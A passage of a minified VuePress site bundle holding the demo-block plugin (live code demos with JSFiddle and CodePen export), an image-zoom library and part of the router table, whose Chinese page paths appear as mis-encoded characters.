1;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer:hover .vuepress-plugin-demo-block__expand::before {\n  border-top-color: #3eaf7c !important;\n  border-bottom-color: #3eaf7c !important;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer:hover svg {\n  fill: #3eaf7c !important;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer .vuepress-plugin-demo-block__expand-text {\n  transition: all 0.5s;\n  opacity: 0;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer form:nth-last-child(2) {\n  right: 50px;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer form:last-child {\n  right: 10px;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer .vuepress-plugin-demo-block__button {\n  border-color: transparent;\n  background-color: transparent;\n  font-size: 14px;\n  color: #3eaf7c;\n  cursor: pointer;\n  outline: none;\n  margin: 0;\n  width: 46px;\n  position: relative;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer .vuepress-plugin-demo-block__button:hover::before {\n  content: attr(data-tip);\n  white-space: nowrap;\n  position: absolute;\n  top: -30px;\n  left: 50%;\n  color: #eee;\n  line-height: 1;\n  z-index: 1000;\n  border-radius: 4px;\n  padding: 6px;\n  -webkit-transform: translateX(-50%);\n          transform: translateX(-50%);\n  background-color: rgba(0, 0, 0, 0.8);\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer .vuepress-plugin-demo-block__button:hover::after {\n  content: '' !important;\n  display: block;\n  position: absolute;\n  left: 50%;\n  top: -5px;\n  -webkit-transform: translateX(-50%);\n          transform: translateX(-50%);\n  border: 5px solid transparent;\n  border-top-color: rgba(0, 0, 0, 0.8);\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer .vuepress-plugin-demo-block__button svg {\n  width: 34px;\n  height: 20px;\n  fill: #ccc;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer .vuepress-plugin-demo-block__jsfiddle,\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer .vuepress-plugin-demo-block__codepen {\n  position: absolute;\n  top: 10px;\n  transition: all 0.5s;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer .vuepress-plugin-demo-block__expand {\n  position: relative;\n  width: 100px;\n  height: 40px;\n  margin: 0;\n  color: #3eaf7c;\n  font-size: 14px;\n  background-color: transparent;\n  border-color: transparent;\n  outline: none;\n  transition: all 0.5s;\n  cursor: pointer;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer .vuepress-plugin-demo-block__expand::before {\n  content: \"\";\n  position: absolute;\n  top: 50%;\n  left: 50%;\n  width: 0;\n  height: 0;\n  border-top: 6px solid #ccc;\n  border-right: 6px solid transparent;\n  border-left: 6px solid transparent;\n  -webkit-transform: translate(-50%, -50%);\n          transform: translate(-50%, -50%);\n}\n");var Ts={jsLib:[],cssLib:[],jsfiddle:!0,codepen:!0,codepenLayout:"left",codepenJsProcessor:"babel",codepenEditors:"101",horizontal:!1,vue:"https://cdn.jsdelivr.net/npm/vue/dist/vue.min.js",react:"https://cdn.jsdelivr.net/npm/react/umd/react.production.min.js",reactDOM:"https://cdn.jsdelivr.net/npm/react-dom/umd/react-dom.production.min.js"},Es={},As=function(n){return'<div id="app">\n'.concat(n,"\n</div>")},zs=function(n){return window.$VUEPRESS_DEMO_BLOCK&&void 0!==window.$VUEPRESS_DEMO_BLOCK[n]?window.$VUEPRESS_DEMO_BLOCK[n]:Ts[n]},qs=function n(e,t,r){var a=document.createElement(e);return t&&Object.keys(t).forEach((function(n){if(n.indexOf("data"))a[n]=t[n];else{var e=n.replace("data","");a.dataset[e]=t[n]}})),r&&r.forEach((function(e){var t=e.tag,r=e.attrs,i=e.children;a.appendChild(n(t,r,i))})),a},Ms=function(n,e,t){var r,a=(r=n.querySelectorAll(".".concat(e)),Array.prototype.slice.call(r));return 1!==a.length||t?a:a[0]},Ps=function(n,e){var t,r,a=n.match(/<style>([\s\S]+)<\/style>/),i=n.match(/<template>([\s\S]+)<\/template>/),o=n.match(/<script>([\s\S]+)<\/script>/),s={css:a&&a[1].replace(/^\n|\n$/g,""),html:i&&i[1].replace(/^\n|\n$/g,""),js:o&&o[1].replace(/^\n|\n$/g,""),jsLib:e.jsLib||[],cssLib:e.cssLib||[]};s.htmlTpl=As(s.html),s.jsTpl=(t=s.js,r=t.replace(/export\s+default\s*?\{\n*/,"").replace(/\n*\}\s*$/,"").trim(),"new Vue({\n  el: '#app',\n  ".concat(r,"\n})")),s.script=function(n,e){var t=n.split(/export\s+default/),r="(function() {".concat(t[0]," ; return ").concat(t[1],"})()"),a=window.Babel?window.Babel.transform(r,{presets:["es2015"]}).code:r,i=[eval][0](a);return i.template=e,i}(s.js,s.html);var l=zs("vue");return s.jsLib.unshift(l),s},Ls=function(n,e){var t,r=n.match(/<style>([\s\S]+)<\/style>/),a=n.match(/<html>([\s\S]+)<\/html>/),i=n.match(/<script>([\s\S]+)<\/script>/),o={css:r&&r[1].replace(/^\n|\n$/g,""),html:a&&a[1].replace(/^\n|\n$/g,""),js:i&&i[1].replace(/^\n|\n$/g,""),jsLib:e.jsLib||[],cssLib:e.cssLib||[]};return o.htmlTpl=o.html,o.jsTpl=o.js,o.script=(t=o.js,window.Babel?window.Babel.transform(t,{presets:["es2015"]}).code:t),o},Rs=function(n){return n=n.replace("export default ","").replace(/App\.__style__(\s*)=(\s*)`([\s\S]*)?`/,""),n+='ReactDOM.render(React.createElement(App), document.getElementById("app"))'};function Os(){var n=Ms(document,"vuepress-plugin-demo-block__wrapper",!0);n.length?n.forEach((function(n){if("true"!==n.dataset.created){n.style.display="block";var e=Ms(n,"vuepress-plugin-demo-block__code"),t=Ms(n,"vuepress-plugin-demo-block__display"),r=Ms(n,"vuepress-plugin-demo-block__footer"),a=Ms(t,"vuepress-plugin-demo-block__app"),i=decodeURIComponent(n.dataset.code),o=decodeURIComponent(n.dataset.config),s=decodeURIComponent(n.dataset.type);o=o?JSON.parse(o):{};var l=e.querySelector("div").clientHeight,c="react"===s?function(n,e){var t=(0,window.Babel.transform)(n,{presets:["es2015","react"]}).code,r="(function(exports){var module={};module.exports=exports;".concat(t,";return module.exports.__esModule?module.exports.default:module.exports;})({})"),a=new Function("return ".concat(r))(),i={js:a,css:a.__style__||"",jsLib:e.jsLib||[],cssLib:e.cssLib||[],jsTpl:Rs(n),htmlTpl:As("")},o=zs("react"),s=zs("reactDOM");return i.jsLib.unshift(o,s),i}(i,o):"vanilla"===s?Ls(i,o):Ps(i,o),p=qs("button",{className:"".concat("vuepress-plugin-demo-block__expand")});if(r.appendChild(p),p.addEventListener("click",Ds.bind(null,p,l,e,r)),zs("jsfiddle")&&r.appendChild(function(n){var e=n.css,t=n.htmlTpl,r=n.jsTpl,a=n.jsLib,i=n.cssLib,o=a.concat(i).concat(zs("cssLib")).concat(zs("jsLib")).join(",");return qs("form",{className:"vuepress-plugin-demo-block__jsfiddle",target:"_blank",action:"https://jsfiddle.net/api/post/library/pure/",method:"post"},[{tag:"input",attrs:{type:"hidden",name:"css",value:e}},{tag:"input",attrs:{type:"hidden",name:"html",value:t}},{tag:"input",attrs:{type:"hidden",name:"js",value:r}},{tag:"input",attrs:{type:"hidden",name:"panel_js",value:3}},{tag:"input",attrs:{type:"hidden",name:"wrap",value:1}},{tag:"input",attrs:{type:"hidden",name:"resources",value:o}},{tag:"button",attrs:{type:"submit",className:"vuepress-plugin-demo-block__button",innerHTML:'<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg t="1547088289967" class="icon" style="" viewBox="0 0 1170 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1952" xmlns:xlink="http://www.w3.org/1999/xlink" width="228.515625" height="200"><defs><style type="text/css"></style></defs><path d="M1028.571429 441.142857q63.428571 26.285714 102.571428 83.142857T1170.285714 650.857143q0 93.714286-67.428571 160.285714T940 877.714286q-2.285714 0-6.571429-0.285715t-6-0.285714H232q-97.142857-5.714286-164.571429-71.714286T0 645.142857q0-62.857143 31.428571-116t84-84q-6.857143-22.285714-6.857142-46.857143 0-65.714286 46.857142-112t113.714286-46.285714q54.285714 0 98.285714 33.142857 42.857143-88 127.142858-141.714286t186.571428-53.714285q94.857143 0 174.857143 46T982.571429 248.571429t46.571428 172q0 3.428571-0.285714 10.285714t-0.285714 10.285714zM267.428571 593.142857q0 69.714286 48 110.285714t118.857143 40.571429q78.285714 0 137.142857-56.571429-9.142857-11.428571-27.142857-32.285714T519.428571 626.285714q-38.285714 37.142857-82.285714 37.142857-31.428571 0-53.428571-19.142857T361.714286 594.285714q0-30.285714 22-49.714285t52.285714-19.428572q25.142857 0 48.285714 12t41.714286 31.428572 37.142857 42.857142 39.428572 46.857143 44 42.857143 55.428571 31.428572 69.428571 12q69.142857 0 116.857143-40.857143T936 594.857143q0-69.142857-48-109.714286t-118.285714-40.571428q-81.714286 0-137.714286 55.428571l53.142857 61.714286q37.714286-36.571429 81.142857-36.571429 29.714286 0 52.571429 18.857143t22.857143 48q0 32.571429-21.142857 52.285714t-53.714286 19.714286q-24.571429 0-47.142857-12t-41.142857-31.428571-37.428572-42.857143-39.714286-46.857143-44.285714-42.857143-55.142857-31.428571T434.285714 444.571429q-69.714286 0-118.285714 40.285714T267.428571 593.142857z" p-id="1953"></path></svg>',datatip:"JSFiddle"}}])}(c)),zs("codepen")&&r.appendChild(function(n){var e=n.css,t=n.htmlTpl,r=n.jsTpl,a=n.jsLib,i=n.cssLib,o=JSON.stringify({css:e,html:t,js:r,js_external:a.concat(zs("jsLib")).join(";"),css_external:i.concat(zs("cssLib")).join(";"),layout:zs("codepenLayout"),js_pre_processor:zs("codepenJsProcessor"),editors:zs("codepenEditors")});return qs("form",{className:"vuepress-plugin-demo-block__codepen",target:"_blank",action:"https://codepen.io/pen/define",method:"post"},[{tag:"input",attrs:{type:"hidden",name:"data",value:o}},{tag:"button",attrs:{type:"submit",innerHTML:'<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg t="1547088271207" class="icon" style="" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1737" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><defs><style type="text/css"></style></defs><path d="M123.428571 668l344.571429 229.714286v-205.142857L277.142857 565.142857z m-35.428571-82.285714l110.285714-73.714286-110.285714-73.714286v147.428572z m468 312l344.571429-229.714286-153.714286-102.857143-190.857143 127.428572v205.142857z m-44-281.714286l155.428571-104-155.428571-104-155.428571 104zM277.142857 458.857143l190.857143-127.428572V126.285714L123.428571 356z m548.571429 53.142857l110.285714 73.714286V438.285714z m-78.857143-53.142857l153.714286-102.857143-344.571429-229.714286v205.142857z m277.142857-102.857143v312q0 23.428571-19.428571 36.571429l-468 312q-12 7.428571-24.571429 7.428571t-24.571429-7.428571L19.428571 704.571429q-19.428571-13.142857-19.428571-36.571429V356q0-23.428571 19.428571-36.571429L487.428571 7.428571q12-7.428571 24.571429-7.428571t24.571429 7.428571l468 312q19.428571 13.142857 19.428571 36.571429z" p-id="1738"></path></svg>',className:"vuepress-plugin-demo-block__button",datatip:"Codepen"}}])}(c)),void 0!==o.horizontal?o.horizontal:zs("horizontal")){n.classList.add("vuepress-plugin-demo-block__horizontal");var d=e.firstChild.cloneNode(!0);d.classList.add("vuepress-plugin-demo-block__h_code"),t.appendChild(d)}if(c.css&&function(n){if(!Es[n]){var e=qs("style",{innerHTML:n});document.body.appendChild(e),Es[n]=!0}}(c.css),"react"===s)ReactDOM.render(React.createElement(c.js),a);else if("vue"===s){var m=(new(Vue.extend(c.script))).$mount();a.appendChild(m.$el)}else"vanilla"===s&&(a.innerHTML=c.html,new Function("return (function(){".concat(c.script,"})()"))());n.dataset.created="true"}})):setTimeout((function(n){Os()}),300)}function Ds(n,e,t,r){var a="1"!==n.dataset.isExpand;t.style.height=a?"".concat(e,"px"):0,a?r.classList.add("vuepress-plugin-demo-block__show-link"):r.classList.remove("vuepress-plugin-demo-block__show-link"),n.dataset.isExpand=a?"1":"0"}var Bs={mounted:function(){window.$VUEPRESS_DEMO_BLOCK={jsfiddle:!1,codepen:!0,horizontal:!1},Os()},updated:function(){Os()}},Us="auto",Fs="zoom-in",Ns="zoom-out",Hs="grab",$s="move";function Vs(n,e,t){var r=!(arguments.length>3&&void 0!==arguments[3])||arguments[3],a={passive:!1};r?n.addEventListener(e,t,a):n.removeEventListener(e,t,a)}function Gs(n,e){if(n){var t=new Image;t.onload=function(){e&&e(t)},t.src=n}}function Ws(n){return n.dataset.original?n.dataset.original:"A"===n.parentNode.tagName?n.parentNode.getAttribute("href"):null}function Js(n,e,t){!function(n){var e=Qs,t=Xs;if(n.transition){var r=n.transition;delete n.transition,n[e]=r}if(n.transform){var a=n.transform;delete n.transform,n[t]=a}}(e);var r=n.style,a={};for(var i in e)t&&(a[i]=r[i]||""),r[i]=e[i];return a}var Qs="transition",Xs="transform",Ys="transform",Zs="transitionend";var Ks=function(){},nl={enableGrab:!0,preloadImage:!1,closeOnWindowResize:!0,transitionDuration:.4,transitionTimingFunction:"cubic-bezier(0.4, 0, 0, 1)",bgColor:"rgb(255, 255, 255)",bgOpacity:1,scaleBase:1,scaleExtra:.5,scrollThreshold:40,zIndex:998,customSize:null,onOpen:Ks,onClose:Ks,onGrab:Ks,onMove:Ks,onRelease:Ks,onBeforeOpen:Ks,onBeforeClose:Ks,onBeforeGrab:Ks,onBeforeRelease:Ks,onImageLoading:Ks,onImageLoaded:Ks},el={init:function(n){var e,t;e=this,t=n,Object.getOwnPropertyNames(Object.getPrototypeOf(e)).forEach((function(n){e[n]=e[n].bind(t)}))},click:function(n){if(n.preventDefault(),rl(n))return window.open(this.target.srcOriginal||n.currentTarget.src,"_blank");this.shown?this.released?this.close():this.release():this.open(n.currentTarget)},scroll:function(){var n=document.documentElement||document.body.parentNode||document.body,e=window.pageXOffset||n.scrollLeft,t=window.pageYOffset||n.scrollTop;null===this.lastScrollPosition&&(this.lastScrollPosition={x:e,y:t});var r=this.lastScrollPosition.x-e,a=this.lastScrollPosition.y-t,i=this.options.scrollThreshold;(Math.abs(a)>=i||Math.abs(r)>=i)&&(this.lastScrollPosition=null,this.close())},keydown:function(n){(function(n){return"Escape"===(n.key||n.code)||27===n.keyCode})(n)&&(this.released?this.close():this.release(this.close))},mousedown:function(n){if(tl(n)&&!rl(n)){n.preventDefault();var e=n.clientX,t=n.clientY;this.pressTimer=setTimeout(function(){this.grab(e,t)}.bind(this),200)}},mousemove:function(n){this.released||this.move(n.clientX,n.clientY)},mouseup:function(n){tl(n)&&!rl(n)&&(clearTimeout(this.pressTimer),this.released?this.close():this.release())},touchstart:function(n){n.preventDefault();var e=n.touches[0],t=e.clientX,r=e.clientY;this.pressTimer=setTimeout(function(){this.grab(t,r)}.bind(this),200)},touchmove:function(n){if(!this.released){var e=n.touches[0],t=e.clientX,r=e.clientY;this.move(t,r)}},touchend:function(n){(function(n){n.targetTouches.length})(n)||(clearTimeout(this.pressTimer),this.released?this.close():this.release())},clickOverlay:function(){this.close()},resizeWindow:function(){this.close()}};function tl(n){return 0===n.button}function rl(n){return n.metaKey||n.ctrlKey}var al={init:function(n){this.el=document.createElement("div"),this.instance=n,this.parent=document.body,Js(this.el,{position:"fixed",top:0,left:0,right:0,bottom:0,opacity:0}),this.updateStyle(n.options),Vs(this.el,"click",n.handler.clickOverlay.bind(n))},updateStyle:function(n){Js(this.el,{zIndex:n.zIndex,backgroundColor:n.bgColor,transition:"opacity\n        "+n.transitionDuration+"s\n        "+n.transitionTimingFunction})},insert:function(){this.parent.appendChild(this.el)},remove:function(){this.parent.removeChild(this.el)},fadeIn:function(){this.el.offsetWidth,this.el.style.opacity=this.instance.options.bgOpacity},fadeOut:function(){this.el.style.opacity=0}},il="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&&"function"==typeof Symbol&&n.constructor===Symbol&&n!==Symbol.prototype?"symbol":typeof n},ol=function(){function n(n,e){for(var t=0;t<e.length;t++){var r=e[t];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(n,r.key,r)}}return function(e,t,r){return t&&n(e.prototype,t),r&&n(e,r),e}}(),sl=Object.assign||function(n){for(var e=1;e<arguments.length;e++){var t=arguments[e];for(var r in t)Object.prototype.hasOwnProperty.call(t,r)&&(n[r]=t[r])}return n},ll={init:function(n,e){this.el=n,this.instance=e,this.srcThumbnail=this.el.getAttribute("src"),this.srcset=this.el.getAttribute("srcset"),this.srcOriginal=Ws(this.el),this.rect=this.el.getBoundingClientRect(),this.translate=null,this.scale=null,this.styleOpen=null,this.styleClose=null},zoomIn:function(){var n=this.instance.options,e=n.zIndex,t=n.enableGrab,r=n.transitionDuration,a=n.transitionTimingFunction;this.translate=this.calculateTranslate(),this.scale=this.calculateScale(),this.styleOpen={position:"relative",zIndex:e+1,cursor:t?Hs:Ns,transition:Ys+"\n        "+r+"s\n        "+a,transform:"translate3d("+this.translate.x+"px, "+this.translate.y+"px, 0px)\n        scale("+this.scale.x+","+this.scale.y+")",height:this.rect.height+"px",width:this.rect.width+"px"},this.el.offsetWidth,this.styleClose=Js(this.el,this.styleOpen,!0)},zoomOut:function(){this.el.offsetWidth,Js(this.el,{transform:"none"})},grab:function(n,e,t){var r=cl(),a=r.x-n,i=r.y-e;Js(this.el,{cursor:$s,transform:"translate3d(\n        "+(this.translate.x+a)+"px, "+(this.translate.y+i)+"px, 0px)\n        scale("+(this.scale.x+t)+","+(this.scale.y+t)+")"})},move:function(n,e,t){var r=cl(),a=r.x-n,i=r.y-e;Js(this.el,{transition:Ys,transform:"translate3d(\n        "+(this.translate.x+a)+"px, "+(this.translate.y+i)+"px, 0px)\n        scale("+(this.scale.x+t)+","+(this.scale.y+t)+")"})},restoreCloseStyle:function(){Js(this.el,this.styleClose)},restoreOpenStyle:function(){Js(this.el,this.styleOpen)},upgradeSource:function(){if(this.srcOriginal){var n=this.el.parentNode;this.srcset&&this.el.removeAttribute("srcset");var e=this.el.cloneNode(!1);e.setAttribute("src",this.srcOriginal),e.style.position="fixed",e.style.visibility="hidden",n.appendChild(e),setTimeout(function(){this.el.setAttribute("src",this.srcOriginal),n.removeChild(e)}.bind(this),50)}},downgradeSource:function(){this.srcOriginal&&(this.srcset&&this.el.setAttribute("srcset",this.srcset),this.el.setAttribute("src",this.srcThumbnail))},calculateTranslate:function(){var n=cl(),e=this.rect.left+this.rect.width/2,t=this.rect.top+this.rect.height/2;return{x:n.x-e,y:n.y-t}},calculateScale:function(){var n=this.el.dataset,e=n.zoomingHeight,t=n.zoomingWidth,r=this.instance.options,a=r.customSize,i=r.scaleBase;if(!a&&e&&t)return{x:t/this.rect.width,y:e/this.rect.height};if(a&&"object"===(void 0===a?"undefined":il(a)))return{x:a.width/this.rect.width,y:a.height/this.rect.height};var o=this.rect.width/2,s=this.rect.height/2,l=cl(),c={x:l.x-o,y:l.y-s},p=c.x/o,d=c.y/s,m=i+Math.min(p,d);if(a&&"string"==typeof a){var u=t||this.el.naturalWidth,g=e||this.el.naturalHeight,h=parseFloat(a)*u/(100*this.rect.width),f=parseFloat(a)*g/(100*this.rect.height);if(m>h||m>f)return{x:h,y:f}}return{x:m,y:m}}};function cl(){var n=document.documentElement;return{x:Math.min(n.clientWidth,window.innerWidth)/2,y:Math.min(n.clientHeight,window.innerHeight)/2}}function pl(n,e,t){["mousedown","mousemove","mouseup","touchstart","touchmove","touchend"].forEach((function(r){Vs(n,r,e[r],t)}))}var dl=function(){function n(e){!function(n,e){if(!(n instanceof e))throw new TypeError("Cannot call a class as a function")}(this,n),this.target=Object.create(ll),this.overlay=Object.create(al),this.handler=Object.create(el),this.body=document.body,this.shown=!1,this.lock=!1,this.released=!0,this.lastScrollPosition=null,this.pressTimer=null,this.options=sl({},nl,e),this.overlay.init(this),this.handler.init(this)}return ol(n,[{key:"listen",value:function(n){if("string"==typeof n)for(var e=document.querySelectorAll(n),t=e.length;t--;)this.listen(e[t]);else"IMG"===n.tagName&&(n.style.cursor=Fs,Vs(n,"click",this.handler.click),this.options.preloadImage&&Gs(Ws(n)));return this}},{key:"config",value:function(n){return n?(sl(this.options,n),this.overlay.updateStyle(this.options),this):this.options}},{key:"open",value:function(n){var e=this,t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:this.options.onOpen;if(!this.shown&&!this.lock){var r="string"==typeof n?document.querySelector(n):n;if("IMG"===r.tagName){if(this.options.onBeforeOpen(r),this.target.init(r,this),!this.options.preloadImage){var a=this.target.srcOriginal;null!=a&&(this.options.onImageLoading(r),Gs(a,this.options.onImageLoaded))}this.shown=!0,this.lock=!0,this.target.zoomIn(),this.overlay.insert(),this.overlay.fadeIn(),Vs(document,"scroll",this.handler.scroll),Vs(document,"keydown",this.handler.keydown),this.options.closeOnWindowResize&&Vs(window,"resize",this.handler.resizeWindow);var i=function n(){Vs(r,Zs,n,!1),e.lock=!1,e.target.upgradeSource(),e.options.enableGrab&&pl(document,e.handler,!0),t(r)};return Vs(r,Zs,i),this}}}},{key:"close",value:function(){var n=this,e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:this.options.onClose;if(this.shown&&!this.lock){var t=this.target.el;this.options.onBeforeClose(t),this.lock=!0,this.body.style.cursor=Us,this.overlay.fadeOut(),this.target.zoomOut(),Vs(document,"scroll",this.handler.scroll,!1),Vs(document,"keydown",this.handler.keydown,!1),this.options.closeOnWindowResize&&Vs(window,"resize",this.handler.resizeWindow,!1);var r=function r(){Vs(t,Zs,r,!1),n.shown=!1,n.lock=!1,n.target.downgradeSource(),n.options.enableGrab&&pl(document,n.handler,!1),n.target.restoreCloseStyle(),n.overlay.remove(),e(t)};return Vs(t,Zs,r),this}}},{key:"grab",value:function(n,e){var t=arguments.length>2&&void 0!==arguments[2]?arguments[2]:this.options.scaleExtra,r=arguments.length>3&&void 0!==arguments[3]?arguments[3]:this.options.onGrab;if(this.shown&&!this.lock){var a=this.target.el;this.options.onBeforeGrab(a),this.released=!1,this.target.grab(n,e,t);var i=function n(){Vs(a,Zs,n,!1),r(a)};return Vs(a,Zs,i),this}}},{key:"move",value:function(n,e){var t=arguments.length>2&&void 0!==arguments[2]?arguments[2]:this.options.scaleExtra,r=arguments.length>3&&void 0!==arguments[3]?arguments[3]:this.options.onMove;if(this.shown&&!this.lock){this.released=!1,this.body.style.cursor=$s,this.target.move(n,e,t);var a=this.target.el,i=function n(){Vs(a,Zs,n,!1),r(a)};return Vs(a,Zs,i),this}}},{key:"release",value:function(){var n=this,e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:this.options.onRelease;if(this.shown&&!this.lock){var t=this.target.el;this.options.onBeforeRelease(t),this.lock=!0,this.body.style.cursor=Us,this.target.restoreOpenStyle();var r=function r(){Vs(t,Zs,r,!1),n.lock=!1,n.released=!0,e(t)};return Vs(t,Zs,r),this}}}]),n}();const ml=JSON.parse('{"bgColor":"rgba(0,0,0,0.6)"}'),ul=Number("500");class gl{constructor(){this.instance=new dl(ml)}update(n=".theme-vdoing-content img:not(.no-zoom)"){"undefined"!=typeof window&&this.instance.listen(n)}updateDelay(n=".theme-vdoing-content img:not(.no-zoom)",e=ul){setTimeout(()=>this.update(n),e)}}var hl=[fs,ks,js,Is,Bs,{watch:{"$page.path"(){void 0!==this.$vuepress.zooming&&this.$vuepress.zooming.updateDelay()}},mounted(){this.$vuepress.zooming=new gl,this.$vuepress.zooming.updateDelay()}}],fl={name:"GlobalLayout",computed:{layout(){const n=this.getLayout();return ds("layout",n),Gt.component(n)}},methods:{getLayout(){if(this.$page.path){const n=this.$page.frontmatter.layout;return n&&(this.$vuepress.getLayoutAsyncComponent(n)||this.$vuepress.getVueComponent(n))?n:"Layout"}return"NotFound"}}},bl=t(0),vl=Object(bl.a)(fl,(function(){return(0,this._self._c)(this.layout,{tag:"component"})}),[],!1,null,null,null).exports;!function(n,e,t){switch(e){case"components":n[e]||(n[e]={}),Object.assign(n[e],t);break;case"mixins":n[e]||(n[e]=[]),n[e].push(...t);break;default:throw new Error("Unknown option name.")}}(vl,"mixins",hl);const yl=[{name:"v-f6da7732",path:"/dev/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-f6da7732").then(t)}},{path:"/dev/index.html",redirect:"/dev/"},{path:"/00.ç®å½é¡µ/00.å¯¼èªæ /01.å¼å.html",redirect:"/dev/"},{name:"v-4b18908b",path:"/sec/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-4b18908b").then(t)}},{path:"/sec/index.html",redirect:"/sec/"},{path:"/00.ç®å½é¡µ/00.å¯¼èªæ /02.å®å¨.html",redirect:"/sec/"},{name:"v-3acc97ec",path:"/life/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-3acc97ec").then(t)}},{path:"/life/index.html",redirect:"/life/"},{path:"/00.ç®å½é¡µ/00.å¯¼èªæ /03.çæ´».html",redirect:"/life/"},{name:"v-572c22a4",path:"/more/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-572c22a4").then(t)}},{path:"/more/index.html",redirect:"/more/"},{path:"/00.ç®å½é¡µ/00.å¯¼èªæ /04.æ´å¤.html",redirect:"/more/"},{name:"v-c09a6976",path:"/dev/web/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-c09a6976").then(t)}},{path:"/dev/web/index.html",redirect:"/dev/web/"},{path:"/00.ç®å½é¡µ/01.å¼å/00.åç«¯.html",redirect:"/dev/web/"},{name:"v-667b11b3",path:"/dev/java/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-667b11b3").then(t)}},{path:"/dev/java/index.html",redirect:"/dev/java/"},{path:"/00.ç®å½é¡µ/01.å¼å/01.åç«¯.html",redirect:"/dev/java/"},{name:"v-637ee5a8",path:"/dev/basic/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-637ee5a8").then(t)}},{path:"/dev/basic/index.html",redirect:"/dev/basic/"},{path:"/00.ç®å½é¡µ/01.å¼å/02.è®¡ç®æºåºç¡.html",redirect:"/dev/basic/"},{name:"v-20ccf4ba",path:"/sec/sa/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-20ccf4ba").then(t)}},{path:"/sec/sa/index.html",redirect:"/sec/sa/"},{path:"/00.ç®å½é¡µ/02.å®å¨/00.éæåæ.html",redirect:"/sec/sa/"},{name:"v-0767abfc",path:"/sec/vuln/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-0767abfc").then(t)}},{path:"/sec/vuln/index.html",redirect:"/sec/vuln/"},{path:"/00.ç®å½é¡µ/02.å®å¨/01.æ¼æ´åç.html",redirect:"/sec/vuln/"},{name:"v-284a5c70",path:"/sec/dev/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-284a5c70").then(t)}},{path:"/sec/dev/index.html",redirect:"/sec/dev/"},{path:"/00.ç®å½é¡µ/02.å®å¨/02.å®å¨å¼å.html",redirect:"/sec/dev/"},{name:"v-f5009938",path:"/sec/skill/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-f5009938").then(t)}},{path:"/sec/skill/index.html",redirect:"/sec/skill/"},{path:"/00.ç®å½é¡µ/02.å®å¨/03.å¥æ·«å·§æ.html",redirect:"/sec/skill/"},{name:"v-9567367a",path:"/more/blog/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-9567367a").then(t)}},{path:"/more/blog/index.html",redirect:"/more/blog/"},{path:"/00.ç®å½é¡µ/04.æ´å¤/00.åå®¢æ­å»º.html",redirect:"/more/blog/"},{name:"v-236f9bdc",path:"/dev/web/basis/htmlandcss/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-236f9bdc").then(t)}},{path:"/dev/web/basis/htmlandcss/index.html",redirect:"/dev/web/basis/htmlandcss/"},{path:"/01.å¼å/100.åç«¯/1000.åç«¯åºç¡/00. HTML&CSSåºç¡.html",redirect:"/dev/web/basis/htmlandcss/"},{name:"v-1068c768",path:"/dev/java/core/spring5/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-1068c768").then(t)}},{path:"/dev/java/core/spring5/index.html",redirect:"/dev/java/core/spring5/"},{path:"/01.å¼å/101.åç«¯/1011.å¾®æå¡æ ¸å¿/00.Spring5.html",redirect:"/dev/java/core/spring5/"},{name:"v-3ddfa200",path:"/dev/java/core/springmvc/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-3ddfa200").then(t)}},{path:"/dev/java/core/springmvc/index.html",redirect:"/dev/java/core/springmvc/"},{path:"/01.å¼å/101.åç«¯/1011.å¾®æå¡æ ¸å¿/01.SpringMVC.html",redirect:"/dev/java/core/springmvc/"},{name:"v-18fb999c",path:"/dev/java/core/mybatis/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-18fb999c").then(t)}},{path:"/dev/java/core/mybatis/index.html",redirect:"/dev/java/core/mybatis/"},{path:"/01.å¼å/101.åç«¯/1011.å¾®æå¡æ 